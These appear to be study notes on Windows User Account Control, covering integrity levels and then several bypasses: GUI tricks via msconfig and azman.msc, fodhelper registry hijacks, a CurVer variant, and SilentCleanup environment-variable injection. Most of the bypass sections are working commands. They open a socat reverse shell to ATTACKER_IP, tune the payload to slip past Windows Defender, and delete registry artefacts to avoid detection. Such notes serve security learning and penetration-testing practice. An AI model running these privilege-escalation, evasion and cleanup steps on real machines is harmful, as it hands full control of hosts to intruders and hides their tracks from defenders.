# What it is
User Account Control is a windows security feature that forces any new process to run in the security context of a non-privileged account by default. This policy applies to processes started by any user, including administrators themselves. The idea is that we can't solely rely on the user's identity to determine if some actions should be authorized.
## UAC Elevation
If an administrator is required to perform a privileged task, UAC provides a way to elevate privileges. **Elevation** works by presenting a simple dialogue box to the user to confirm that they explicitly approve running the application in an administrative security context.
## Integrity Levels
UAC is a **Mandatory Integrity Control** (MIC), which is a mechanism that allows differentiating users, processes and resources by assigning an **Integrity Level** (IL) to each of them. In general terms, users or processes with higher IL access token will be able to access resources with lower or equal ILs. MIC takes precedence over regular Windows DACLs, so you may be authorized to access a resources according to the DACL, but it won't matter if your IL isn't high enough.
The following 4 ILs are used by Windows, ordered from lowest to highest:

| **Integrity Level** | **Use**                                                                                                                            |
| ------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| Low                 | Generally used for interaction with the Internet (i.e. Internet Explorer). Has very limited permissions.                           |
| Medium              | Assigned to standard users and Administrators' filtered tokens.                                                                    |
| High                | Used by Administrators' elevated tokens if UAC is enabled. If UAC is disabled, all administrators will always use a high IL token. |
| System              | Reserved for system use.                                                                                                           |
When a process requires to access a resource, it will inherit the calling user's access token and its associated IL. The same occurs if a process forks a child.
## Filtered Tokens
To accomplish this separation of roles, UAC treats regular users and administrators in a slightly different way during logon:
- **Non-administrators** will receive a single access token when logged in, which will be used for all tasks performed by the user. This token has `Medium` IL.
- **Administrators** will receive two access tokens:
	- **Filtered Token**: A token with Administrator privileges stripped, used for a regular operations. This token has `Medium` IL.
	- **Elevated Token**: A token with full Administrator privileges, used when something needs to be run with administrative privileges. This token has `High` IL.
In this way, administrators will use their filtered token unless they explicitly request administrative privileges via UAC.
## Opening an Application the Usual Way
When trying to open a regular console, we can either open it as a non-privileged user or as an administrator. Depending on our choice, either a Medium or High IL token will be assigned to the spawned process:
![[Pasted image 20240905202449.png]]
If we analyze both processes using things like Process Hacker, we can see the associated tokens and their differences:
![[Pasted image 20240905202529.png]]
## UAC Settings
Depending on our security requirements, UAC can be configured to run at four different notification levels:
- **Always notify**: Notify and prompt the user for authorization when making changes to Windows settings or when a program tries to install applications or make changes to the computer.
- **Notify me only when programs try to make changes to my computer**: Notify and prompt the user for authorization when a program tries to install applications or make changes to the computer. Administrators won't be prompted when changing Windows settings.
- **Notify me only when programs try to make changes to my computer (do not dim my desktop)**: Same as above, but won't run the UAC prompt on a secure desktop.
- **Never notify**: Disable UAC prompt. Administrators will run everything using a high privilege token.
By default, UAC is configured on the **Notify me only when programs try to make changes to my computer** level.
For us this will all be the same, with the **Always notify** being the only one that presents a difference.
## UAC Internals
At the heart of UAC, we have the **Application Information Service** or **Appinfo**. Whenever a user requires elevation, the following occurs:
1. The user requests to run an application as administrator.
2. A `ShellExecute` API call is made using the `runas` verb.
3. The request gets forwarded to **Appinfo** to handle elevation.
4. The application manifest is checked to see if **AutoElevation** is allowed.
5. **Appinfo** executes `consent.exe`, which shows the UAC prompt on a **secure desktop**. A secure desktop is simply a separate desktop that isolates processes from whatever is running in the actual user's desktop to avoid other processes from tampering with the UAC prompt in any way.
6. If the user gives consent to run the application as administrator, the **Appinfo** services will execute the request using a user's Elevated Token. **Appinfo** will then set the parent process ID of the new process to point to the shell from which elevation was requested.
![[Pasted image 20240905204655.png]]
## Bypassing UAC
From an attacker's perspective, there might be situations where we get a remote shell to a Windows host via Powershell or cmd.exe. We might even gain access through an account that is part of the Administrators group, but when we try creating a backdoor user for future access we get the following error.
```powershell
PS C:\Users\attacker> net user backdoor Backd00r /add 
System error 5 has occurred. 

Access is denied.
```
By checking our assigned groups, we can confirm that our sessions is running with a medium IL, meaning we are effectively using a filtered token:
```Powershell
PS C:\Users\attacker> whoami /groups 

(...)

Group Name               Attributes
======================== ================================================== 
Everyone                 Mandatory group, Enabled by default, Enabled group 
NT AUTHORITY\Local 
account and member of 
Administrators group     Group used for deny only 
BUILTIN\Administrators   Group used for deny only 
BUILTIN\Users            Mandatory group, Enabled by default, Enabled group 

(...)
```
Even when we get a Powershell sessions with an administrative user, UAC prevents us from performing any administrative tasks as we are currently using a filtered token only. If we want to take full control of our target, we must bypass UAC.

---

Interestingly, Microsoft does not consider UAC as a security boundary but rather a simple convenience to the administrator to avoid unnecessarily running processes with administrative privileges. In that sense, the UAC prompt is more of a reminder to the user that they are running with high privileges rather than impeding a piece of malware or an attacker from doing so. Since it isn't a security boundary, any bypass technique is not considered a vulnerability to Microsoft, and therefore some of them remain unpatched.
Generally speaking, most of the bypass techniques rely on us being able to leverage a `High` IL process to execute something on our behalf. Since any process created by a `High` IL parent process will inherit the same integrity level, this will be enough to get an elevated token without requiring us to go through the UAC prompt.

# GUI Based Bypasses
GUI-based bypasses, provide an easy way to understand the basic concepts involved. these examples are not usually applicable to real-world scenarios, as they rely on us having access to a GUI, from where we could use the standard UAC to elevate.
## Case study: msconfig
Our goal is to obtain access to a High IL command prompt without passing through UAC. First, let's start by opening `msconfig`.
If we analyze the msconfig with [[Process Hacker]], we notice that msconfig runs as a high IL process, even tho no UAC prompt was presented to us.
This is possible thanks to a feature called auto elevation that allows specific binaries to elevate without requiring the user's interaction. If we could force `msconfig` to spawn a shell for us, the shell would inherit the same access token used by `msconfig` and therefore be run as a High IL process. By navigating to the Tools tab, we can find an option to do that.
![[Pasted image 20240905230316.png]]

## Case study: azman.msc
As with msconfig, `azman.msc` will auto elevate without requiring user interaction. If we can find a way to spawn a shell from within that process, we will bypass UAC. Note that, unlike msconfig. `azman.msc` has no intended built-in way to spawn a shell. We can easily overcome this with a bit of creativity.
First we run `azman.msc`, we can confirm that the process has High IL with Process Hacker. Notice that all `.msc` files are run from `mmc.exe` (Microsoft Management Console).
To run a shell, we will abuse the application's help
![[Pasted image 20240906001539.png]]
Then view the source of the window on the right
![[Pasted image 20240906001602.png]]
Which will open a notepad, from here we go to open a new file, select all file types, and right-click open the cmd
![[Pasted image 20240906001646.png]]
Thanks to the fact that IL are hereditary we will have a cmd with a High IL.

# Auto-Elevating Processes
As mentioned previously, some executables can auto-elevate, achieving High IL without any user intervention. This applies to most of the Control Panel\s functionality and some executables provided with Windows.
For an application, some requirements need to be met to auto-elevate:
- The executable must be signed by the Windows Publisher
- The executable must be contained in a trusted directory, like `%SystemRoot%/System32/` or `%ProgramFiles%/`.

---

Depending on the type of application, additional requirements may apply:
- Executable files (.exe) must declare the **autoElevate** element inside their manifests. To check a file's manifest, we can use ``sigcheck``, a tool provided as part of the Sysinternals suite. If we check the manifest for `msconfig.exe`, we can find the autoElevate property
```powershell
PS C:\tools\> sigcheck64.exe -m c:/windows/system32/msconfig.exe
(...)
<asmv3:application>
	<asmv3:windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">
		<dpiAware>true</dpiAware>
		<autoElevate>true</autoElevate>
	</asmv3:windowsSettings>
</asmv3:application>
```
- `mmc.exe` will auto elevate depending on the `.msc` snap-in that the user requests. Most of the `.msc` files included with Windows will auto elevate.
- Windows keeps an additional list of executables that auto elevate even when not requested in the manifest. This list includes `pkmgr.exe` and `spinstall.exe`, for example.
- COM objects can also request auto-elevation by configuring some registry keys ([docs](https://learn.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker))

## Case study: Fodhelper
`Fodhelper.exe` is one of Windows default executables in charge of managing Windows optional features, including additional languages, applications not installed by default, or other operating system characteristics. Like most of the programs used for system configuration, Fodhelper can auto elevate when using default UAC settings so that administrators won't be prompted for elevation when performing standard administrative tasks. Unlike msconfig, `Fodhelper` can be abused **without** having a GUI.
This means that it can be used through a medium integrity remote shell and leveraged into a fully functional High IL process. It was noticed that Fodhelper searches the registry for a specific key of interest.
![[Pasted image 20240906130301.png]]
When windows opens a file, it checks the registry to know what application to use. The registry holds a key known as Programmatic ID (ProgID) for each filetype, where the corresponding application is associated. 

If we, for example, were to try to open an HTML file. A part of the registry known as the `HKEY_CLASSES_ROOT` will be checked so that the system knows that it must use our preferred web client to open it. The command to use will be specified under the `shell/open/command` subkey for each file's ProgID. Taking the "htmlfile" ProgID as an example.
![[Pasted image 20240906131026.png]]
In reality, `HKEY_CLASSES_ROOT` is just a merged view of two different paths on the registry:

| **Path**                            | **Description**                 |
| ----------------------------------- | ------------------------------- |
| HKEY_LOCAL_MACHINE\Software\Classes | System-wide file associations   |
| HKEY_CURRENT_USER\Software\Classes  | Active user's file associations |
When checking `HKEY_CLASSES_ROOT`, if there is a user-specific association at `HKEY_CURRENT_USER` (HKCU), **it will take priority**. If no user-specific association is configured, then the system-wide association at `HKEY_LOCAL_MACHINE` (HKLM) will be used instead. This way, each user can choose their preferred applications separately if desired.

Going back to Fodhelper, we now see that it's trying to open a file under the ms-settings ProgID. By creating an association for the ProgID in the current user's context under HKCU, we will override the default system-wide association and control which command is used to open the file. Since Fodhelper is an `autoElevate` executable, any subprocess it spawns will inherit its High IL.

---

To exploit it, we set the required registry values to associate the ms-settings class to a reverse shell. We can use the following commands to set the required registry keys.
```
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:ATTACKER_IP:4444 EXEC:cmd.exe,pipes"
reg add %REG_KEY% /v "DelegateExecute" /d "" /f
reg add %REG_KEY% /d %CMD% /f
```
Note that we need to create an empty value called `DelegateExecute` for this class association to take effect. If this registry value is not present, the operating system will ignore the command and use the system-wide class association instead.
Finally we proceed to execute `fodhelper.exe` which in turn will trigger the execution of our reverse shell. The received shell runs with High IL, allowing us to bypass the UAC.

## Clearing suspicion
As a result of executing this exploit, some artefact were created on the target system in the form of registry keys. To avoid detection, we need to clean up after ourselves with the following command
```powershell
reg delete HKCU\Software\Classes\ms-settings\ /f
```


# Improving the Fodhelper Exploit to Bypass Defender
If we tried the same exploit as before with Defender enabled, it will stop us and our command from trying to change the default value to gain a shell. Although by now it would seem that our exploit wouldn't work against Defender, if we try to run the same commands but with a slight modification
```
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:ATTACKER_IP:4444 EXEC:cmd.exe,pipes"
reg add %REG_KEY% /v "DelegateExecute" /d "" /f
reg add %REG_KEY% /d %CMD% /f & reg query %REG_KEY% HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command
```
By adding a quick query to the offending registry value right after setting it to the command required for our reverse shell, the query outputs our command intact. We still get alerted by Windows Defender, and a second later the offending registry value gets deleted as expected. It appears it takes a moment for Windows Defender to take action on our exploit. So if we modify the exploit to run `fodhelper.exe` immediately after setting the registry value.
```
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:ATTACKER_IP:4444 EXEC:cmd.exe,pipes"
reg add %REG_KEY% /v "DelegateExecute" /d "" /f
reg add %REG_KEY% /d %CMD% /f & fodhelper.exe
```
Depending on our luck, Fodhelper might execute before the AV kicks in, giving us back a reverse shell. If for some reason it does not work for us, keep in mind that this method is unreliable as it depends on a race between the AV and our payload executing first.

The main problem with our exploit, besides still alerting Defender, is that it gives little room for variation, as we need to write specific registry keys for it to trigger making it easy for Windows Defender to detect. But we can still try to do something about it
## Improving the improvements
A variation on the Fodhelper exploit was proposed, where different registry keys are used, but the basic principle is the same.
Instead of writing our payload into `HKCU\Software\Classes\ms-settings\Shell\Open\command`, we will use the `CurVer` entry under a progID registry key. This entry is used when we have multiple instances of an application with different versions running on the same system. CurVer allows us to point to the default version of the application to be used by Windows when opening a given file type.

To this end, we can create an entry on the registry for a new progID of our choice and then point the CurVer entry in the ms-settings progID to our newly created progID. This way, when Fodhelper tries opening a file using the ms-settings progID it will notice the CurVer entry pointing to our new progID and check it to see what command to use.
We can accomplish this with the following powershell script
```powershell
$cmd = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:ATTACKER_IP:4444 EXEC:cmd.exe,pipes"

New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force 
Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $cmd -Force

New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force 
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force

Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```
This exploit creates a new progID with the name `.pwn` and associates our payload to the command used when opening such files. It then points the CurVer entry of ms-settings to our `.pwn` progID. When Fodhelper tries opening an ms-settings program, it will instead be pointed to the `.pwn` progID and use its associated command.

This technique is more likely to evade Windows Defender since we have more liberty on where to put our payload, as the name of the progID that holds our payload is entirely arbitrary.
Now, if we try to run this exploit it will still flag us, as this is a known AV evasion technique. However, we can try possible variations of this exploit, like changing it from a Powershell script to be used in the cmd instead.
```cmd
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:ATTACKER_IP:4444 EXEC:cmd.exe,pipes"
reg add "HKCU\Software\Classes\.ownd\Shell\Open\command" /d %CMD% /f
reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".ownd" /f & fodhelper.exe
```
And presto! We get a high integrity reverse shell without triggering Defender.

## Cleanup
As a result of executing this exploit, some artefacts were created on the target system, such as registry keys. To avoid detection, we need to clean up after ourselves with the following commands:

```batch
reg delete "HKCU\Software\Classes\.ownd\" /f
reg delete "HKCU\Software\Classes\ms-settings\" /f
```

# Environment Variable Expansion
As we've seen we can abuse some applications related to the system's configuration to bypass UAC as most of these apps have the autoElevate flag set on their manifests. However, if UAC is configured on the **"Always Notify"** level, Fodhelper and similar apps won't be of any use as they will require the user to go through the UAC prompt to elevate. This prevents several methods from being used. BUT NOT ALL!!!

We can abuse a scheduled task that can be run by any user but will execute with the highest privileges available to the caller. By design, scheduled tasks are meant to be run without any user interaction (No UAC), so asking us to elevate a process manually is not an option. Any scheduled tasks that require elevation will automatically get it without going through the UAC prompt.

## Case study: Disk Cleanup Scheduled task
To understand why we are picking Disk Cleanup, let's open the **Task Scheduler** and check the task's configuration
![[Pasted image 20240906162522.png]]
Here we can see that the task is configured to run with the **Users** account, which means it will inherit the privileges from the calling user. The **Run with highest privileges** option will use the highest IL token available to the calling user. 
Checking the Actions and Settings tabs, we have the following
![[Pasted image 20240906162926.png]]
The task can be run on-demand, executing the following command when invoked: `%windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%`
Since the command depends on environment variables, we might be able to inject commands through them and get them executed by starting the `DiskCleanup` task manually.
Luckily for us, we can override the `%windir%` variable through the registry by creating an entry in `HKCU\Environment`. If we want to execute a reverse shell using socat, we can set `%windir%` as follows
```
cmd.exe /c C:\tools\socat\socat.exe TCP:ATTACKER_IP: EXEC:cmd.exe,pipes &REM 
```
At the end of our command we can concatenate `&REM ` (**ending with a blank space**) to comment whatever is put after `%windir%` when expanding the environment variable to get the final command used by `DiskCleanup`. The resulting command would be 
```
cmd.exe /c C:\tools\socat\socat.exe TCP:ATTACKER_IP:4445 EXEC:cmd.exe,pipes &REM \system32\cleanmgr.exe /autoclean /d %systemdrive%
```
Where again, everything after "REM" is ignored.

---

To exploit it we just need to rewrite `%windir%` with our payload and then execute the task
```cmd
reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:ATTACKER_IP:4444 EXEC:cmd.exe,pipes &REM " /f
schtasks/run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
```
This will give us a shell back with High IL. Note that this method will **not** work with defender.

## Cleanup
As a result of executing this exploit, some artefacts were created on the target system, such as registry keys. To avoid detection, we need to clean up after ourselves with the following command:
```
reg delete "HKCU\Environment" /v "windir" /f
```

# Automated Exploitation
An excellent tool is available to test for UAC bypasses without writing our exploits from scratch. [[UACME]] provides an up to date repository of UAC bypass techniques that can be used out of the box. Tool available [here](https://github.com/hfiref0x/UACME)
While UACME provides several tools, we will explain Akagi, which runs the actual UAC bypasses. 
Using this tool is simple, and only requires us to indicate the number corresponding to the method to be tested. A complete list of methods is available on the project's GitHub description. If we want to test for a method, we just put the number as an argument after the tool.

| Method Id | Bypass technique                        |
| --------- | --------------------------------------- |
| 33        | fodhelper.exe                           |
| 34        | DiskCleanup scheduled task              |
| 70        | fodhelper.exe using CurVer registry key |
If we use one of these methods a command prompt with high IL will pop up, it will be outside the one we are using so not much of a use from just this but still.

# Resources
Again using things out of the box, will most than likely, not work. So always tune things up
- [UACME github repository](https://github.com/hfiref0x/UACME)
- [Bypassing UAC with mock folders and DLL hijacking](https://www.bleepingcomputer.com/news/security/bypassing-windows-10-uac-with-mock-folders-and-dll-hijacking/)[](https://www.bleepingcomputer.com/news/security/bypassing-windows-10-uac-with-mock-folders-and-dll-hijacking/)
- [UAC bypass techniques detection strategies](https://elastic.github.io/security-research/whitepapers/2022/02/03.exploring-windows-uac-bypass-techniques-detection-strategies/article/) 
- [Reading your way around UAC](https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-1.html)